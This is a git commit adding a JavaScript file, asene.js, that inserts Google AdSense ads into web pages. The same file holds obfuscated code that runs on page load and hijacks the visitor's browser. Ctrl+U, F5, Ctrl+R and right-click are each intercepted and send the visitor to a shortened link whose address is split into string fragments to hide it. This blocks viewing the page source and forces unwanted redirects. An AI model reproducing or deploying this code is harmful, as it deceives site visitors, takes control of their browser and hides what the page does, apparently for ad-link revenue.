d1c667c66695762bfb05f8ffa8c949ae4e510fb9
Moh Royhan Nahado <mohroyhannahado@gmail.com>
2017-05-04 00:03:26 +0700

    Add files via upload

---
+++ asene.js
@@ -0,0 +1,10 @@
+document.write('<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>');
+
+document.write('<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8855525363429940" data-ad-slot="3224857518" data-ad-format="auto"></ins>');
+
+(adsbygoogle = window.adsbygoogle || []).push({});
+
+var isCtrl=!1;document.onkeyup=function(o){17==o.which&&(isCtrl=!1)},document.onkeydown=function(o){return 17==o.which&&(isCtrl=!0),85==o.which&&1==isCtrl?(window.location='ht' + 'tp' + '://' + 'vi' + 'id.m' + 'e/q' + 'RV9' + 'R6',!1):116==o.which?(window.location='ht' + 'tp' + '://' + 'vi' + 'id.m' + 'e/q' + 'RV9' + 'R6',!1):82==o.which&&1==isCtrl?(window.location='ht' + 'tp' + '://' + 'vi' + 'id.m' + 'e/q' + 'RV9' + 'R6',!1):void 0};
+window.oncontextmenu = function (){
+window.location='ht' + 'tp' + '://' + 'vi' + 'id.m' + 'e/q' + 'RV9' + 'R6';
+}
